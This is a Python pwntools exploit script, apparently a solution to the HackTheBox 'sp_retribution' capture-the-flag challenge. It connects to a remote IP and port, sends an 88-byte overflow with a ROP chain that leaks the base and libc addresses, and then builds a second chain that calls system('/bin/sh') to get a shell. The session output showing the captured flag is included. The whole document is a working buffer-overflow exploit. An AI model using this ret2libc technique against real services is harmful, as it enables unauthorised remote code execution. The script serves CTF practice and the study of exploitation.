#https://drive.google.com/file/d/1uGhFxeXSmu6Vo9hPfFnGY7EPKc0KRgaM/view
#https://shakuganz.com/2021/06/04/hackthebox-restaurant-write-up/
#https://fdlucifer.github.io/2021/05/08/pwn-restaurant/

#!/usr/bin/python3

'''
cyclic -l vaaa
84
84+4 == 88

!!!Debugging in local windows machine is OK, but in lab's ubuntu nuc failed as the pop_rdi_ret address cannot access...

'''

from pwn import *

context.arch = 'amd64'

elf = ELF('./sp_retribution')
libc = ELF('./glibc/libc.so.6')

padding = b'A'*(88)

#io = process('./sp_retribution')
ip, port = "144.126.232.205", 32161
io = remote(ip, port)

io.sendlineafter('>> ','2')

rop = ROP(elf)


io.sendlineafter('y = ', '')
base = io.recvuntil(' (y/n): ').split(b'\n')[-2]
base = u32(base[1:])<<16

print(hex(base))

pop_rdi_ret = 0x0000000000000d33

rop_chain = p64(base + pop_rdi_ret)
rop_chain += p64(base + elf.got['puts'])
rop_chain += p64(base + elf.plt['puts'])
rop_chain += p64(base + elf.symbols['missile_launcher'])

payload1 = padding + rop_chain

io.sendline(payload1)
io.recvuntil(b'\x1b[1;34m\n')

puts_addr = u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00'))
log.info("Leaked server's libc address, puts(): "+hex(puts_addr))

server_libc_base = puts_addr - libc.symbols['puts']
log.info("Leaked server's libc base address: "+hex(server_libc_base))

libc.address = server_libc_base

#payload2: get the shell
rop_libc = ROP(libc)
rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
payload2 = padding + rop_libc.chain()

io.sendlineafter('y = ', '[0x53e5854620fb399f]')
io.sendlineafter(' (y/n): ', payload2)
io.interactive()

'''
!!!Some times you just need to re-try several times...

$ ls
core
flag.txt
glibc
sp_retribution
$ cat flag.txt
HTB{w3_f1n4lly_m4d3_1t}
'''
